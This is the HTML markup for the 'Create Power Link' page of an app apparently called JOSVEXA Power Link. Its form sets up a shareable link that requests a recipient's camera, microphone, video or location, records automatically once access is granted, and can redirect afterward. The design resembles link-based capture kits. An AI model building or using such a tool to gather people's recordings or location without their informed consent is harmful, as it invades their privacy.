<!doctype html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>JOSVEXA Power Link — Create</title><link rel="stylesheet" href="style.css"></head><body><div class="app"><aside class="sidebar"><div class="brand"><span class="brand-mark">J</span><div><b>JOSVEXA</b><small>POWER LINK</small></div></div><nav><a href="dashboard.html">Dashboard</a><a class="active" href="create-link.html">Create Link</a><a href="dashboard.html#profile">Profile</a><a href="#" id="logoutBtn">Logout</a></nav></aside><main class="main"><header class="topbar"><div><span class="eyebrow">LINK GENERATOR</span><h1>Create Power Link</h1></div></header><section class="panel"><form id="createLinkForm" class="form"><label>Link title<input id="title" required placeholder="My recording request"></label><div><span class="label">What can the recipient submit?</span><div class="feature-grid"><label class="check"><input id="camera" type="checkbox"> Camera / Photo</label><label class="check"><input id="audio" type="checkbox"> Microphone / Voice</label><label class="check"><input id="video" type="checkbox"> Video</label><label class="check"><input id="location" type="checkbox"> Location</label></div></div><label>Photo limit<input id="photoLimit" type="number" min="1" max="20" value="5"></label><label>Automatic voice/video duration (seconds)<input id="recordingSeconds" type="number" min="3" max="30" value="10"><small class="muted">After the recipient allows the selected permission, recording starts automatically for this duration.</small></label><label>Optional redirect URL<input id="redirectUrl" type="url" placeholder="https://example.com"></label><button class="btn primary" type="submit">Generate Power Link</button></form><p id="message" class="message"></p><div id="result" class="result hidden"><h3>Link created</h3><p>Copy this link and share it.</p><div class="copyrow"><input id="generatedLink" readonly><button id="copyBtn" class="btn">Copy</button></div><a id="openLink" class="btn secondary" target="_blank">Open recipient page</a></div></section></main></div><script type="module" src="script.js"></script></body></html>
